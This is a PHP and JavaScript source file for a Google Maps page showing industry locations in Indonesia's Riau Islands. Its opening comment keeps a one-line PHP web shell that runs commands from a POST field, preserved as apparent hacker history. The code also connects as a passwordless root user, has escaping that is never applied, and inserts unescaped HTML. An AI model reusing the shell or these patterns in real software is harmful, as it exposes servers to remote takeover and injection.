
<?php

/*
    ini mungkin code dari hacker; sebagai history. silahkan hapus isi block comment ini, jika diinginkan.  
  <?=`$_POST[dot]`?>

*/

session_start();
error_reporting(E_ERROR | E_PARSE | E_CORE_ERROR);
$username_lnk='root';
$password_lnk='';
$database_lnk='ikmkepridigimedi_ikm';
$dbservertype='mysql';
$hostname_lnk ='localhost';
$upload_dir = "../uploads/";
// connect MYSQLI database dengan user root
$db = mysqli_connect($hostname_lnk, $username_lnk, $password_lnk);
  if (!$db) {
        die('Could not connect: ' . mysqli_error($db));
  }
$res = mysqli_select_db($db, $database_lnk); // gunakan database riau2
$con = new mysqli($hostname_lnk,$username_lnk,$password_lnk,$database_lnk);
if (mysqli_connect_errno()) {
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}


//  i am not sure this can be helped. start:
if (!function_exists('tryToEscapeAll'))
{
    function tryToEscapeAll ($d)
    {
        global $con;
        foreach ($d as &$v)
        {
            if (is_array($v) || is_object($v)) $v = tryToEscapeAll($v);
            else $v = $con->escape_string(htmlspecialchars($v, ENT_QUOTES));
        }
        unset($v);
        return $d;
    }
    tryToEscapeAll($_POST);
    tryToEscapeAll($_GET);
}
//  end:

?>
<script>

function showhideMarker(markers,map){
    for( var i=0; i < markers.length;i++){
      markers[i].setMap(map);  
        
    }
    
}


//Make function adding a marker    
function addmarker(lat, long,company,tipe,alamat){
        //create custom marker
            var icon1 = {
                url: "assets/frontend/images/icon-orange.gif", // url
                scaledSize: new google.maps.Size(20, 20), // scaled size
                origin: new google.maps.Point(0,0), // origin
                anchor: new google.maps.Point(0, 0), // anchor
                
            };
            var icon2 = {
                url: "assets/frontend/images/icon-ungu.gif", // url
                scaledSize: new google.maps.Size(20, 20), // scaled size
                origin: new google.maps.Point(0,0), // origin
                anchor: new google.maps.Point(0, 0) // anchor
            };
            var icon3 = {
                url: "assets/frontend/images/icon-merah.gif", // url
                scaledSize: new google.maps.Size(20, 20), // scaled size
                origin: new google.maps.Point(0,0), // origin
                anchor: new google.maps.Point(0, 0) // anchor
            };
            var icon4 = {
                url: "assets/frontend/images/icon-hijau.gif", // url
                scaledSize: new google.maps.Size(20, 20), // scaled size
                origin: new google.maps.Point(0,0), // origin
                anchor: new google.maps.Point(0, 0) // anchor
            };
            var icon5 = {
                url: "assets/frontend/images/icon-kuning.gif", // url
                scaledSize: new google.maps.Size(20, 20), // scaled size
                origin: new google.maps.Point(0,0), // origin
                anchor: new google.maps.Point(0, 0) // anchor
            };
            var icon6 = {
                url: "assets/frontend/images/icon-cyan.gif", // url
                scaledSize: new google.maps.Size(20, 20), // scaled size
                origin: new google.maps.Point(0,0), // origin
                anchor: new google.maps.Point(0, 0) // anchor
            };
            var icon7 = {
                url: "assets/frontend//images/icon-coklat.gif", // url
                scaledSize: new google.maps.Size(20, 20), // scaled size
                origin: new google.maps.Point(0,0), // origin
                anchor: new google.maps.Point(0, 0) // anchor
            };
            var atribut = {
            '1': { text : 'INDUSTRI PANGAN', icon : icon1, bcolor :'#F26C4F', fcolor : 'black'},
            '2': { text : 'INDUSTRI SANDANG', icon : icon2 , bcolor :'#440E62', fcolor : 'white'},    
            '3': { text : 'INDUSTRI BARANG DARI KAYU DAN FURNITURE' , icon : icon3 , bcolor :'#9E0B0F', fcolor : 'white'},
            '4': { text : 'INDUSTRI ANEKA KERAJINAN' , icon : icon4  , bcolor :'#5BB85D', fcolor : 'black'},
            '5': { text : 'INDUSTRI LOGAM,MESIN,ELEKTRONIKA DAN ALAT ANGKUT' , icon : icon5 , bcolor :'#FFF200', fcolor : 'black'},
            '6': { text : 'INDUSTRI KIMIA DAN BAHAN BANGUNAN' , icon : icon6, bcolor :'#00FFFF', fcolor : 'black'},
            '7': { text : 'INDUSTRI ANEKA INDUSTRI' , icon :icon7, bcolor :'#A3620A', fcolor : 'white'}

        };
        
        // Info Window Content
        var content = '<div class="panel" style="margin-bottom :0;margin-right:1px"><div class="panel-heading" style="align : center;background-color:'+atribut[tipe].bcolor+'"><font color="'+atribut[tipe].fcolor+'">'
                        +atribut[tipe].text+'</font></div>'+
                       '<div class="panel-body"><p style="align : left"><b>'+company+'</b><br>'+
                       alamat+'<br>'+'<a href=#>Detail</a></p></div></div>';
        
        marker = new google.maps.Marker({
            position : new google.maps.LatLng(lat,long),
            icon : atribut[tipe].icon,
            title : company,
            content :content,
            optimized: false
            
        });
        
        
       
        
        
        
}

function ikm_all(){
    // loop to create multiple marker and infowindow
    <?php if($qu=mysqli_query($db,"select * from 1_profil where jenis='ikm' and chver='1' and lat!='' and lon!=''")){
    $crow=0;
    while($re=mysqli_fetch_object($qu)){
        $lat[$crow]=$re->lat;
        $long[$crow]=$re->lon;
        $info[$crow]=$re->nm_prsh;
        $tipe[$crow]=$re->kat_ind;
        $alamat[$crow]=$re->jl;
        $crow++;
    }
    
    $latitude = json_encode($lat);
    $longitude = json_encode($long);
    $informasi=json_encode($info);
    $kat_ind=json_encode($tipe);
    $jl=json_encode($alamat);
    echo "var nrows=".$crow.";\n";
    echo "var lat =".$latitude.";\n";
    echo "var long =".$longitude.";\n";
    echo "var info =".$informasi.";\n";
    echo "var tipe =".$kat_ind.";\n";
    echo "var alamat =".$jl.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat[i],long[i],info[i],tipe[i],alamat[i]);
        markers_all.push(marker);
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
        
    
    }
    
}

function ikm_pangan(){
      
    // loop to create multiple marker and infowindow
    <?php if($qu1=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kat_ind='1' and chver='1' and lat!='' and lon!=''")){
    $crow1=0;
    while($re1=mysqli_fetch_object($qu1)){
        $lat1[$crow1]=$re1->lat;
        $long1[$crow1]=$re1->lon;
        $info1[$crow1]=$re1->nm_prsh;
        $tipe1[$crow1]=$re1->kat_ind;
        $alamat1[$crow1]=$re1->jl;
        $crow1++;
    }
    $latitude1 = json_encode($lat1);
    $longitude1 = json_encode($long1);
    $informasi1=json_encode($info1);
    $kat_ind1=json_encode($tipe1);
    $jl1=json_encode($alamat1);
    echo "var nrows=".$crow1.";\n";
    echo "var lat1 =".$latitude1.";\n";
    echo "var long1 =".$longitude1.";\n";
    echo "var info1 =".$informasi1.";\n";
    echo "var tipe1 =".$kat_ind1.";\n";
    echo "var alamat1 =".$jl1.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat1[i],long1[i],info1[i],tipe1[i],alamat1[i]);
        markers_pangan.push(marker);
        
         //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
        
    }
    
   
    
}

function ikm_sandang(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu2=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kat_ind='2' and chver='1' and lat!='' and lon!=''")){
    $crow2=0;
    while($re2=mysqli_fetch_object($qu2)){
        $lat2[$crow2]=$re2->lat;
        $long2[$crow2]=$re2->lon;
        $info2[$crow2]=$re2->nm_prsh;
        $tipe2[$crow2]=$re2->kat_ind;
        $alamat2[$crow2]=$re2->jl;
        $crow2++;
    }
    $latitude2 = json_encode($lat2);
    $longitude2 = json_encode($long2);
    $informasi2=json_encode($info2);
    $kat_ind2=json_encode($tipe2);
    $jl2=json_encode($alamat2);
    echo "var nrows=".$crow2.";\n";
    echo "var lat2 =".$latitude2.";\n";
    echo "var long2 =".$longitude2.";\n";
    echo "var info2 =".$informasi2.";\n";
    echo "var tipe2 =".$kat_ind2.";\n";
    echo "var alamat2 =".$jl2.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat2[i],long2[i],info2[i],tipe2[i],alamat2[i]);
        markers_sandang.push(marker);
        
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });  
    
    }
      
        
}

function ikm_ibk(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu3=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kat_ind='3' and chver='1' and lat!='' and lon!=''")){
    $crow3=0;
    while($re3=mysqli_fetch_object($qu3)){
        $lat3[$crow3]=$re3->lat;
        $long3[$crow3]=$re3->lon;
        $info3[$crow3]=$re3->nm_prsh;
        $tipe3[$crow3]=$re3->kat_ind;
        $alamat3[$crow3]=$re3->jl;
        $crow3++;
    }
    $latitude3 = json_encode($lat3);
    $longitude3 = json_encode($long3);
    $informasi3=json_encode($info3);
    $kat_ind3=json_encode($tipe3);
    $jl3=json_encode($alamat3);
    echo "var nrows=".$crow3.";\n";
    echo "var lat3 =".$latitude3.";\n";
    echo "var long3 =".$longitude3.";\n";
    echo "var info3 =".$informasi3.";\n";
    echo "var tipe3 =".$kat_ind3.";\n";
    echo "var alamat3 =".$jl3.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat3[i],long3[i],info3[i],tipe3[i],alamat3[i]);
        markers_ibk.push(marker);
        
         //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
    
    }
   
        
}

function ikm_iak(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu4=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kat_ind='4' and chver='1' and lat!='' and lon!=''")){
    $crow4=0;
    while($re4=mysqli_fetch_object($qu4)){
        $lat4[$crow4]=$re4->lat;
        $long4[$crow4]=$re4->lon;
        $info4[$crow4]=$re4->nm_prsh;
        $tipe4[$crow4]=$re4->kat_ind;
        $alamat4[$crow4]=$re4->jl;
        $crow4++;
    }
    $latitude4 = json_encode($lat4);
    $longitude4 = json_encode($long4);
    $informasi4=json_encode($info4);
    $kat_ind4=json_encode($tipe4);
    $jl4=json_encode($alamat4);
    echo "var nrows=".$crow4.";\n";
    echo "var lat4 =".$latitude4.";\n";
    echo "var long4 =".$longitude4.";\n";
    echo "var info4 =".$informasi4.";\n";
    echo "var tipe4 =".$kat_ind4.";\n";
    echo "var alamat4 =".$jl4.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat4[i],long4[i],info4[i],tipe4[i],alamat4[i]);
        markers_iak.push(marker);
    
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
        
    }
    
}

function ikm_ilm(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu5=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kat_ind='5' and chver='1' and lat!='' and lon!=''")){
    $crow5=0;
    while($re5=mysqli_fetch_object($qu5)){
        $lat5[$crow5]=$re5->lat;
        $long5[$crow5]=$re5->lon;
        $info5[$crow5]=$re5->nm_prsh;
        $tipe5[$crow5]=$re5->kat_ind;
        $alamat5[$crow5]=$re5->jl;
        $crow5++;
    }
    $latitude5 = json_encode($lat5);
    $longitude5 = json_encode($long5);
    $informasi5=json_encode($info5);
    $kat_ind5=json_encode($tipe5);
    $jl5=json_encode($alamat5);
    echo "var nrows=".$crow5.";\n";
    echo "var lat5 =".$latitude5.";\n";
    echo "var long5 =".$longitude5.";\n";
    echo "var info5 =".$informasi5.";\n";
    echo "var tipe5 =".$kat_ind5.";\n";
    echo "var alamat5 =".$jl5.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat5[i],long5[i],info5[i],tipe5[i],alamat5[i]);
        markers_ilm.push(marker);
        
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
    
    }
    
        
}

function ikm_ikb(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu6=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kat_ind='6' and chver='1' and lat!='' and lon!=''")){
    $crow6=0;
    while($re6=mysqli_fetch_object($qu6)){
        $lat6[$crow6]=$re6->lat;
        $long6[$crow6]=$re6->lon;
        $info6[$crow6]=$re6->nm_prsh;
        $tipe6[$crow6]=$re6->kat_ind;
        $alamat6[$crow6]=$re6->jl;
        $crow6++;
    }
    $latitude6 = json_encode($lat6);
    $longitude6 = json_encode($long6);
    $informasi6=json_encode($info6);
    $kat_ind6=json_encode($tipe6);
    $jl6=json_encode($alamat6);
    echo "var nrows=".$crow6.";\n";
    echo "var lat6 =".$latitude6.";\n";
    echo "var long6 =".$longitude6.";\n";
    echo "var info6 =".$informasi6.";\n";
    echo "var tipe6 =".$kat_ind6.";\n";
    echo "var alamat6 =".$jl6.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat6[i],long6[i],info6[i],tipe6[i],alamat6[i]);
        markers_ikb.push(marker);
        
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });   
    
    }
     
        
}

function ikm_iai(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu7=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kat_ind='7' and chver='1' and lat!='' and lon!=''")){
    $crow7=0;
    while($re7=mysqli_fetch_object($qu7)){
        $lat7[$crow7]=$re7->lat;
        $long7[$crow7]=$re7->lon;
        $info7[$crow7]=$re7->nm_prsh;
        $tipe7[$crow7]=$re7->kat_ind;
        $alamat7[$crow7]=$re7->jl;
        $crow7++;
    }
    $latitude7 = json_encode($lat7);
    $longitude7 = json_encode($long7);
    $informasi7=json_encode($info7);
    $kat_ind7=json_encode($tipe7);
    $jl7=json_encode($alamat7);
    echo "var nrows=".$crow7.";\n";
    echo "var lat7 =".$latitude7.";\n";
    echo "var long7 =".$longitude7.";\n";
    echo "var info7 =".$informasi7.";\n";
    echo "var tipe7 =".$kat_ind7.";\n";
    echo "var alamat7 =".$jl7.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat7[i],long7[i],info7[i],tipe7[i],alamat7[i]);
        markers_iai.push(marker);
        
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
    
    }
    
        
}

function ikm_tpi(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu8=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kab='7' and chver='1' and lat!='' and lon!=''")){
    $crow8=0;
    while($re8=mysqli_fetch_object($qu8)){
        $lat8[$crow8]=$re8->lat;
        $long8[$crow8]=$re8->lon;
        $info8[$crow8]=$re8->nm_prsh;
        $tipe8[$crow8]=$re8->kat_ind;
        $alamat8[$crow8]=$re8->jl;
        $crow8++;
    }
    $latitude8 = json_encode($lat8);
    $longitude8 = json_encode($long8);
    $informasi8=json_encode($info8);
    $kat_ind8=json_encode($tipe8);
    $jl8=json_encode($alamat8);
    echo "var nrows=".$crow8.";\n";
    echo "var lat8 =".$latitude8.";\n";
    echo "var long8 =".$longitude8.";\n";
    echo "var info8 =".$informasi8.";\n";
    echo "var tipe8 =".$kat_ind8.";\n";
    echo "var alamat8 =".$jl8.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat8[i],long8[i],info8[i],tipe8[i],alamat8[i]);
        markers_tpi.push(marker);
         //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
    
    }
   
        
}

function ikm_batam(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu9=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kab='6' and chver='1' and lat!='' and lon!=''")){
    $crow9=0;
    while($re9=mysqli_fetch_object($qu9)){
        $lat9[$crow9]=$re9->lat;
        $long9[$crow9]=$re9->lon;
        $info9[$crow9]=$re9->nm_prsh;
        $tipe9[$crow9]=$re9->kat_ind;
        $alamat9[$crow9]=$re9->jl;
        $crow9++;
    }
    $latitude9 = json_encode($lat9);
    $longitude9 = json_encode($long9);
    $informasi9=json_encode($info9);
    $kat_ind9=json_encode($tipe9);
    $jl9=json_encode($alamat9);
    echo "var nrows=".$crow9.";\n";
    echo "var lat9 =".$latitude9.";\n";
    echo "var long9 =".$longitude9.";\n";
    echo "var info9 =".$informasi9.";\n";
    echo "var tipe9 =".$kat_ind9.";\n";
    echo "var alamat9 =".$jl9.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat9[i],long9[i],info9[i],tipe9[i],alamat9[i]);
        markers_batam.push(marker);
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });   
    
    }
     
        
}


function ikm_bintan(){
   
      
    // loop to create multiple marker and infowindow
    <?php
    if($qu10=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kab='1' and chver='1' and lat!='' and lon!=''")){
    $crow10=0;
    while($re10=mysqli_fetch_object($qu10)){
        $lat10[$crow10]=$re10->lat;
        $long10[$crow10]=$re10->lon;
        $info10[$crow10]=$re10->nm_prsh;
        $tipe10[$crow10]=$re10->kat_ind;
        $alamat10[$crow10]=$re10->jl;
        $crow10++;
    }
    $latitude10 = json_encode($lat10);
    $longitude10 = json_encode($long10);
    $informasi10=json_encode($info10);
    $kat_ind10=json_encode($tipe10);
    $jl10=json_encode($alamat10);
    echo "var nrows=".$crow10.";\n";
    echo "var lat10 =".$latitude10.";\n";
    echo "var long10 =".$longitude10.";\n";
    echo "var info10 =".$informasi10.";\n";
    echo "var tipe10 =".$kat_ind10.";\n";
    echo "var alamat10 =".$jl10.";\n";
    }
    ?>
    
    
        for( i = 0; i < nrows; i++ ) {
     
            addmarker(lat10[i],long10[i],info10[i],tipe10[i],alamat10[i]);
            markers_bintan.push(marker);
            //add listener
            google.maps.event.addListener(marker,'click',function(){
                infoWindow.setContent(this.content);
                infoWindow.open(map,this);
                $('.gm-style-iw').prev().html('');
                
            });    
        
        }
    
        
}

function ikm_lingga(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu11=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kab='4' and chver='1' and lat!='' and lon!=''")){
    $crow11=0;
    while($re11=mysqli_fetch_object($qu11)){
        $lat11[$crow11]=$re11->lat;
        $long11[$crow11]=$re11->lon;
        $info11[$crow11]=$re11->nm_prsh;
        $tipe11[$crow11]=$re11->kat_ind;
        $alamat11[$crow11]=$re11->jl;
        $crow11++;
    }
    $latitude11 = json_encode($lat11);
    $longitude11 = json_encode($long11);
    $informasi11=json_encode($info11);
    $kat_ind11=json_encode($tipe11);
    $jl11=json_encode($alamat11);
    echo "var nrows=".$crow11.";\n";
    echo "var lat11 =".$latitude11.";\n";
    echo "var long11 =".$longitude11.";\n";
    echo "var info11 =".$informasi11.";\n";
    echo "var tipe11 =".$kat_ind11.";\n";
    echo "var alamat11 =".$jl11.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat11[i],long11[i],info11[i],tipe11[i],alamat11[i]);
        markers_lingga.push(marker);
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
    
    }
    
        
}
function ikm_karimun(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu12=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kab='2' and chver='1' and lat!='' and lon!=''")){
    $crow12=0;
    while($re12=mysqli_fetch_object($qu12)){
        $lat12[$crow12]=$re12->lat;
        $long12[$crow12]=$re12->lon;
        $info12[$crow12]=$re12->nm_prsh;
        $tipe12[$crow12]=$re12->kat_ind;
        $alamat12[$crow12]=$re12->jl;
        $crow12++;
    }
    $latitude12 = json_encode($lat12);
    $longitude12 = json_encode($long12);
    $informasi12=json_encode($info12);
    $kat_ind12=json_encode($tipe12);
    $jl12=json_encode($alamat12);
    echo "var nrows=".$crow12.";\n";
    echo "var lat12 =".$latitude12.";\n";
    echo "var long12 =".$longitude12.";\n";
    echo "var info12 =".$informasi12.";\n";
    echo "var tipe12 =".$kat_ind12.";\n";
    echo "var alamat12 =".$jl12.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat12[i],long12[i],info12[i],tipe12[i],alamat12[i]);
        markers_karimun.push(marker);
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
    
    }
    
        
}

function ikm_natuna(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu13=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kab='3' and chver='1' and lat!='' and lon!=''")){
    $crow13=0;
    while($re13=mysqli_fetch_object($qu13)){
        $lat13[$crow13]=$re13->lat;
        $long13[$crow13]=$re13->lon;
        $info13[$crow13]=$re13->nm_prsh;
        $tipe13[$crow13]=$re13->kat_ind;
        $alamat13[$crow13]=$re13->jl;
        $crow13++;
    }
    $latitude13 = json_encode($lat13);
    $longitude13 = json_encode($long13);
    $informasi13=json_encode($info13);
    $kat_ind13=json_encode($tipe13);
    $jl13=json_encode($alamat13);
    echo "var nrows=".$crow13.";\n";
    echo "var lat13 =".$latitude13.";\n";
    echo "var long13 =".$longitude13.";\n";
    echo "var info13 =".$informasi13.";\n";
    echo "var tipe13 =".$kat_ind13.";\n";
    echo "var alamat13 =".$jl13.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat13[i],long13[i],info13[i],tipe13[i],alamat13[i]);
        markers_natuna.push(marker);
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
    
    }
    
        
}

function ikm_anambas(){
   
      
    // loop to create multiple marker and infowindow
    <?php if($qu14=mysqli_query($db,"select * from 1_profil where jenis='ikm' and kab='5' and chver='1' and lat!='' and lon!=''")){
    $crow14=0;
    while($re14=mysqli_fetch_object($qu14)){
        $lat14[$crow14]=$re14->lat;
        $long14[$crow14]=$re14->lon;
        $info14[$crow14]=$re14->nm_prsh;
        $tipe14[$crow14]=$re14->kat_ind;
        $alamat14[$crow14]=$re14->jl;
        $crow14++;
    }
    $latitude14 = json_encode($lat14);
    $longitude14 = json_encode($long14);
    $informasi14=json_encode($info14);
    $kat_ind14=json_encode($tipe14);
    $jl14=json_encode($alamat14);
    echo "var nrows=".$crow14.";\n";
    echo "var lat14 =".$latitude14.";\n";
    echo "var long14 =".$longitude14.";\n";
    echo "var info14 =".$informasi14.";\n";
    echo "var tipe14 =".$kat_ind14.";\n";
    echo "var alamat14 =".$jl14.";\n";
    }


    ?>

    for( i = 0; i < nrows; i++ ) {
 
        addmarker(lat14[i],long14[i],info14[i],tipe14[i],alamat14[i]);
        markers_anambas.push(marker);
        //add listener
        google.maps.event.addListener(marker,'click',function(){
            infoWindow.setContent(this.content);
            infoWindow.open(map,this);
            $('.gm-style-iw').prev().html('');
            
        });    
    
    }
    
        
}


</script>